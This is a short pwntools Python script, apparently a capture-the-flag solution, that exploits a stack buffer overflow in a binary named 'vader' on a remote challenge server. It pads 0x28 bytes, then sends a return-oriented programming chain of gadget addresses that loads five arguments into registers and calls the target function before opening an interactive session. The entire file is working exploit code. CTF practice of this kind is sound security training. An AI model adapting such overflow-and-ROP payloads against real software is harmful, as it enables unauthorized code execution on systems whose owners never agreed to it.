from pwn import *

p = remote('0.cloud.chals.io', 20712)
# p = process('./vader')
e = ELF('./vader')

pop_rdi = 0x40165b
pop_r8 = 0x4011d9
pop_rcx_rdx = 0x4011cd
pop_rsi_r15 = 0x401659
arg1 = 0x402ec9
arg2 = 0x402ece
arg3 = 0x402ed3
arg4 = 0x402ed6
arg5 = 0x402eda

chain = [
    pop_rdi+1, 
    pop_rdi, arg1, 
    pop_rsi_r15, arg2, 0,
    pop_rcx_rdx, arg4, arg3,
    pop_r8, arg5, 
    e.symbols['vader']
]

payload = b'A' * 0x28
for i in chain:
    payload += p64(i)
p.sendline(payload)
p.interactive()
